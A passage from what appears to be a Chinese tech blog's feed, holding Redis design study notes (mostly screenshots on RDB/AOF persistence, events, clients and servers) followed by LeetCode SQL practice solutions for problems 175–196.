src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209183609.png" alt="image-20211209183607470"></p><p><strong>save 会阻塞 而bgsave会fork出子进程</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209183746.png" alt="image-20211209183744887"></p><p>自动间隔性保存——向服务器提供以下配置</p><p>save 900 1</p><p>save 300 10</p><p>save 60 10000</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209190758.png" alt="image-20211209190754684"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209190817.png" alt="image-20211209190816248"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209191815.png" alt="image-20211209191814227"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209191831.png" alt="image-20211209191829720"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209192048.png" alt="image-20211209192046006"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209192235.png" alt="image-20211209192233830"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209192543.png" alt="image-20211209192542380"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209192525.png" alt="image-20211209192523845"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209193003.png" alt="image-20211209193002367"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209193952.png" alt="image-20211209193949321"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209194014.png" alt="image-20211209194013021"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209194029.png" alt="image-20211209194028129"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209194137.png" alt="image-20211209194135503"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209194441.png" alt="image-20211209194439900"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209194600.png" alt="image-20211209194559651"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209195425.png" alt="image-20211209195424223"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209195513.png" alt="image-20211209195512019"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209195523.png" alt="image-20211209195522617"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209195629.png" alt="image-20211209195628034"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209195859.png" alt="image-20211209195857951"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209200112.png" alt="image-20211209200110921"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209200136.png" alt="image-20211209200134361"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209200336.png" alt="image-20211209200334804"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209201419.png" alt="image-20211209201417378"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209202218.png" alt="image-20211209202216197"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209202422.png" alt="image-20211209202420306"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209202632.png" alt="image-20211209202630267"></p><p>od命令：分析RDB文件</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209202819.png" alt="image-20211209202817141"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209202911.png" alt="image-20211209202910020"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209203251.png" alt="image-20211209203249849"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209203314.png" alt="image-20211209203312340"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209203510.png" alt="image-20211209203509457"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SADD LANG &quot;C&quot; &quot;JAVA&quot; &quot; RUBY&quot;</span><br><span class="line">od -c dump.rdb</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209204019.png" alt="image-20211209204017415"></p><p><strong>RDB文件是一个经过压缩的二进制文件，由多个部分组成。</strong></p><p><strong>对于不同的类型的键值对，RDB文件会使用不同的方式来保存它们。</strong></p><h2 id="第十一章-AOF持久化"><a href="#第十一章-AOF持久化" class="headerlink" title="第十一章 AOF持久化"></a>第十一章 AOF持久化</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209205145.png" alt="image-20211209204905978"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209205133.png" alt="image-20211209205131425"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209205346.png" alt="image-20211209205344887"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209210949.png" alt="image-20211209210948036"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209205540.png" alt="image-20211209205538594"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209211054.png" alt="image-20211209211052409"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209211227.png" alt="image-20211209211226363"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209212545.png" alt="image-20211209212543719"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209213045.png" alt="image-20211209213043058"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209213244.png" alt="image-20211209213243239"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209213419.png" alt="image-20211209213418084"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209213540.png" alt="image-20211209213539294"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209214153.png" alt="image-20211209214151543"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209214447.png" alt="image-20211209214445737"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209214759.png" alt="image-20211209214758411"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209214858.png" alt="image-20211209214856335"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209215048.png" alt="image-20211209215045707"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210084723.png" alt="image-20211210084721206"></p><p><strong>以上就是AOF后台重写，也即是BGREWRITEAOF命令的实现原理</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210084855.png" alt="image-20211210084854065"></p><h2 id="第十二章-事件"><a href="#第十二章-事件" class="headerlink" title="第十二章 事件"></a>第十二章 事件</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210104325.png" alt="image-20211210104324527"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210104949.png" alt="image-20211210104948292"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210110017.png" alt="image-20211210110016462"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210110152.png" alt="image-20211210110150242"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210110746.png" alt="image-20211210110744452"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210110905.png" alt="image-20211210110904536"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210111727.png" alt="image-20211210111726231"></p><h2 id="第十三章-客户端"><a href="#第十三章-客户端" class="headerlink" title="第十三章 客户端"></a>第十三章 客户端</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210124523.png" alt="image-20211210124521208"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210124649.png" alt="image-20211210124639220"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210124744.png" alt="image-20211210124740999"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210125016.png" alt="image-20211210125015172"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210125029.png" alt="image-20211210125027940"></p><p><img src="C:/Users/86158/AppData/Roaming/Typora/typora-user-images/image-20211210125503954.png" alt="image-20211210125503954"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210125646.png" alt="image-20211210125644583"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210125708.png" alt="image-20211210125707017"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210133144.png" alt="image-20211210133142971"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210133736.png" alt="image-20211210133735041"></p><p>PUBSUB命令和SCRIPT LOAD命令有副作用，会被写到AOF文件中。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210134016.png" alt="image-20211210134014593"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210134041.png" alt="image-20211210134038957"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210134056.png" alt="image-20211210134055357"></p><p><strong>输入缓冲最大不能大于1GB，否则服务器将关闭这个客户端</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210134224.png" alt="image-20211210134223161"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210135052.png" alt="image-20211210135051564"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210134259.png" alt="image-20211210134258443"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210135105.png" alt="image-20211210135104211"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210135238.png" alt="image-20211210135237387"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210135557.png" alt="image-20211210135555716"></p><p><img src="C:/Users/86158/AppData/Roaming/Typora/typora-user-images/image-20211210135534034.png" alt="image-20211210135534034"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210135710.png" alt="image-20211210135708633"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210135806.png" alt="image-20211210135804653"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210135820.png" alt="image-20211210135819155"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210135851.png" alt="image-20211210135850076"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210140122.png" alt="image-20211210140121091"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210140420.png" alt="image-20211210140419548"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210140603.png" alt="image-20211210140602303"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210140909.png" alt="image-20211210140907904"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210141228.png" alt="image-20211210141227584"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210141347.png" alt="image-20211210141345883"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210141411.png" alt="image-20211210141410341"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210141428.png" alt="image-20211210141427133"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210142108.png" alt="image-20211210142107605"></p><h2 id="第十四章-服务器"><a href="#第十四章-服务器" class="headerlink" title="第十四章 服务器"></a>第十四章 服务器</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210144004.png" alt="image-20211210144003198"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210144253.png" alt="image-20211210144247782"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210144313.png" alt="image-20211210144311936"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210150259.png" alt="image-20211210150258339"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210150217.png" alt="image-20211210150216002"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210150853.png" alt="image-20211210150852174"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210151719.png" alt="image-20211210151718053"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210151738.png" alt="image-20211210151737257"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210152120.png" alt="image-20211210152118960"></p><p><strong>一些特殊情况要注意（一堆预备操作，可怕）</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210152538.png" alt="image-20211210152537481"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210153420.png" alt="image-20211210153418236"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210153604.png" alt="image-20211210153602813"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210153818.png" alt="image-20211210153817192"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210154035.png" alt="image-20211210154033813"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210154122.png" alt="image-20211210154121704"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210175303.png" alt="image-20211210175301841"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210175920.png" alt="image-20211210175919270"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210180049.png" alt="image-20211210180048321"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210180102.png" alt="image-20211210180100740"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210180438.png" alt="image-20211210180435529"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210181425.png" alt="image-20211210181424235"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210181524.png" alt="image-20211210181523221"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210183435.png" alt="image-20211210183434147"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210183547.png" alt="image-20211210183546502"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210183809.png" alt="image-20211210183808505"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210191307.png" alt="image-20211210191305823"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210191430.png" alt="image-20211210191428758"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第一部分-数据结构与对象&quot;&gt;&lt;a href=&quot;#第一部分-数据结构与对象&quot; class=&quot;headerlink&quot; title=&quot;第一部分 数据结构与对象&quot;&gt;&lt;/a&gt;第一部分 数据结构与对象&lt;/h1&gt;&lt;h2 id=&quot;第二章-简单动态字符串&quot;&gt;&lt;a href=&quot;#第二
      
    
    </summary>
    
    
      <category term="Redis" scheme="https://blog.kaluna.top/categories/Redis/"/>
    
    
      <category term="Redis" scheme="https://blog.kaluna.top/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>leetcode之数据库练习笔记</title>
    <link href="https://blog.kaluna.top/2021/12/05/leetcode%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.kaluna.top/2021/12/05/leetcode%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-12-05T08:08:44.615Z</published>
    <updated>2021-12-07T01:25:18.352Z</updated>
    
    <content type="html"><![CDATA[<p><strong>SQL Select语句完整的执行顺序：</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(1) FROM &lt;left_table&gt;</span><br><span class="line">(2) &lt;join_type&gt; JOIN &lt;right_table&gt;</span><br><span class="line">(3) ON &lt;join_condition&gt;</span><br><span class="line">(4) WHERE &lt;where_condition&gt;</span><br><span class="line">(5) GROUP BY &lt;group_by_list&gt;</span><br><span class="line">(6) WITH &#123;CUBE | ROLLUP&#125;</span><br><span class="line">(7) HAVING &lt;having_condition&gt;</span><br><span class="line">(8) SELECT</span><br><span class="line">(9) DISTINCT</span><br><span class="line">(9) ORDER BY &lt;order_by_list&gt;</span><br><span class="line">(10) &lt;TOP_specification&gt; &lt;select_list&gt;</span><br><span class="line">也就是</span><br><span class="line">1、FROM：对FROM 子句中的前两个表执行笛卡尔积(交叉联接)，生成虚拟表VT1。</span><br><span class="line">2、ON：对VT1 应用ON 筛选器，只有那些使为真才被插入到TV2。</span><br><span class="line">3、OUTER (JOIN):如果指定了OUTER JOIN(相对于CROSS JOIN 或INNER JOIN)，保留表中未找到匹配的行将作为外部行添加到VT2，生成TV3。如果FROM 子句包含两个以上的表，则对上一个联接生成的结果表和下一个表重复执行步骤1 到步骤3，直到处理完所有的表位置。</span><br><span class="line">4、WHERE：对TV3 应用WHERE 筛选器，只有使为true 的行才插入TV4。</span><br><span class="line">5、GROUP BY：按GROUP BY 子句中的列列表对TV4 中的行进行分组，生成TV5。</span><br><span class="line">6、CUTE|ROLLUP：把超组插入VT5，生成VT6。</span><br><span class="line">7、HAVING：对VT6 应用HAVING 筛选器，只有使为true 的组插入到VT7。</span><br><span class="line">8、SELECT：处理SELECT 列表，产生VT8。</span><br><span class="line">9、DISTINCT：将重复的行从VT8 中删除，产品VT9。</span><br><span class="line">10、ORDER BY：将VT9 中的行按ORDER BY 子句中的列列表顺序，生成一个游标(VC10)。</span><br><span class="line">11、TOP：从VC10 的开始处选择指定数量或比例的行，生成表TV11，并返回给调用者。</span><br></pre></td></tr></table></figure><p><strong>以上每个步骤都会产生一个虚拟表，该虚拟表被用作下一个步骤的输入。这些虚拟表对调用者(客户端应用程序或者外部查询)不可用。只有最后一步生成的表才会会给调用者。</strong></p><p> <a href="https://leetcode-cn.com/problems/combine-two-tables" target="_blank" rel="noopener">175. 组合两个表</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">    P.FirstName, P.LastName, A.City, A.State</span><br><span class="line">FROM Person P</span><br><span class="line">LEFT OUTER JOIN Address A</span><br><span class="line">ON P.PersonId &#x3D; A.PersonId</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/second-highest-salary" target="_blank" rel="noopener">176. 第二高的薪水</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT </span><br><span class="line">(</span><br><span class="line">    SELECT DISTINCT Salary</span><br><span class="line">    FROM Employee ORDER BY Salary DESC</span><br><span class="line">    LIMIT 1 OFFSET 1</span><br><span class="line">)</span><br><span class="line">SecondHighestSalary</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/nth-highest-salary" target="_blank" rel="noopener">177. 第N高的薪水</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION getNthHighestSalary(N INT) RETURNS INT</span><br><span class="line">BEGIN</span><br><span class="line">    set n &#x3D; N-1;</span><br><span class="line">  RETURN (</span><br><span class="line">      # Write your MySQL query statement below.</span><br><span class="line">      SELECT DISTINCT Salary</span><br><span class="line">      FROM Employee ORDER BY Salary DESC</span><br><span class="line">      LIMIT 1 OFFSET n</span><br><span class="line">  );</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/rank-scores" target="_blank" rel="noopener">178. 分数排名</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 对于 MySQL 解决方案，如果要转义用作列名的保留字，可以在关键字之前和之后使用撇号。例如 ‘Rank‘</span><br><span class="line">select Score,</span><br><span class="line">        dense_rank() over(order by Score desc) &#39;Rank&#39;</span><br><span class="line">from Scores</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/consecutive-numbers" target="_blank" rel="noopener">180. 连续出现的数字</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 编写一个 SQL 查询，查找所有至少连续出现三次的数字</span><br><span class="line"># Id-cast(row_number() over(partition by Num) as signed) 中间-是减号</span><br><span class="line">select distinct num ConsecutiveNums</span><br><span class="line">from</span><br><span class="line">(</span><br><span class="line">    select num, Id-cast(row_number() over(partition by Num) as signed) rnk</span><br><span class="line">    from Logs</span><br><span class="line">) t</span><br><span class="line">group by num, rnk</span><br><span class="line">having count(*) &gt;&#x3D; 3</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line">select distinct a.num ConsecutiveNums</span><br><span class="line">from Logs a, Logs b, Logs c</span><br><span class="line">where   a.Id &#x3D; b.Id+1</span><br><span class="line">    and b.Id &#x3D; c.Id+1</span><br><span class="line">    and a.Num &#x3D; b.Num</span><br><span class="line">    and b.Num &#x3D; c.Num</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/employees-earning-more-than-their-managers" target="_blank" rel="noopener">181. 超过经理收入的员工</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 把同一份表再次JOIN该表，条件是A.ManagerId &#x3D; B.Id</span><br><span class="line">SELECT A.Name Employee</span><br><span class="line">FROM Employee A</span><br><span class="line">LEFT OUTER JOIN Employee B</span><br><span class="line">ON A.ManagerId &#x3D; B.Id</span><br><span class="line">WHERE A.Salary &gt; B.Salary</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line">SELECT A.Name Employee</span><br><span class="line">FROM Employee A</span><br><span class="line">INNER JOIN Employee B</span><br><span class="line">ON A.ManagerId &#x3D; B.Id</span><br><span class="line">WHERE A.Salary &gt; B.Salary</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/duplicate-emails" target="_blank" rel="noopener">182. 查找重复的电子邮箱</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT Email FROM Person GROUP BY Email HAVING COUNT(Email)&gt;1;</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/customers-who-never-order" target="_blank" rel="noopener">183. 从不订购的客户</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># C.Name Customers重命名了  NOT IN 关键字</span><br><span class="line">SELECT C.Name Customers</span><br><span class="line">FROM Customers C</span><br><span class="line">WHERE C.Id NOT IN </span><br><span class="line">(</span><br><span class="line">    SELECT CustomerId FROM Orders</span><br><span class="line">)</span><br><span class="line"># or  ——这里左外连接了，驱动表有但是被驱动表没有的就可以筛选出来</span><br><span class="line">SELECT C.Name Customers</span><br><span class="line">FROM Customers C</span><br><span class="line">LEFT OUTER JOIN Orders O</span><br><span class="line">ON C.Id &#x3D; O.CustomerId</span><br><span class="line">WHERE O.CustomerId is null</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/department-highest-salary" target="_blank" rel="noopener">184. 部门工资最高的员工</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select d.Name Department, e.Name Employee, e.Salary</span><br><span class="line">from Employee e, Department d</span><br><span class="line">where e.DepartmentId &#x3D; d.Id</span><br><span class="line">    and (e.DepartmentId, Salary) in</span><br><span class="line">        (select DepartmentId, max(Salary) Salary</span><br><span class="line">            from Employee group by DepartmentId)</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/department-top-three-salaries" target="_blank" rel="noopener">185. 部门工资前三高的所有员工</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select Department, Employee, Salary</span><br><span class="line">from</span><br><span class="line">(</span><br><span class="line">    select d.Name Department, e.Name Employee, Salary,</span><br><span class="line">        dense_rank() over(partition by d.Name order by Salary desc) rnk</span><br><span class="line">    from Employee e left join Department d</span><br><span class="line">    on e.DepartmentId &#x3D; d.Id</span><br><span class="line">) t</span><br><span class="line">where rnk &lt;&#x3D; 3 and Department is not null</span><br><span class="line"></span><br><span class="line"># or</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/delete-duplicate-emails" target="_blank" rel="noopener">196. 删除重复的电子邮箱</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">DELETE p1 FROM Person p1, Person p2 </span><br><span class="line">WHERE p1.Email &#x3D; p2.Email AND p1.Id &gt; p2.Id;</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line">DELETE FROM Person</span><br><span class="line">WHERE Id NOT IN</span><br><span class="line">(</span><br><span class="line">    SELECT Id FROM</span><br><span class="line">    (</span><br><span class="line">        SELECT MIN(Id) Id FROM Person GROUP BY Email</span><br><span class="line">    ) tempTableName</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line">select Department, Employee, Salary</span><br><span class="line">from</span><br><span class="line">(</span><br><span class="line">    select d.Name Department, e.Name Employee, Salary,</span><br><span class="line">        dense_rank() over(partition by d.Name order by Salary desc) rnk</span><br><span class="line">    from Employee e right join Department d</span><br><span class="line">    on e.DepartmentId &#x3D; d.Id</span><br><span class="line">) t</span><br><span class="line">where rnk &lt;&#x3D; 3 and Employee is not null</span><br><span class="line"></span><br><span class="line"># or 使用内连接，自动去除 null 的行</span><br><span class="line">select Department, Employee, Salary</span><br><span class="line">from</span><br><span class="line">(</span><br><span class="line">    select d.Name Department, e.Name Employee, Salary,</span><br><span class="line">        dense_rank() over(partition by d.Name order by Salary desc) rnk</span><br><span class="line">    from Employee e join Department d</span><br><span class="line">    on e.DepartmentId &#x3D; d.Id</span><br><span class="line">) t</span><br><span class="line">where rnk &lt;&#x3D; 3</span><br></pre></td></tr></table></figure><p><a 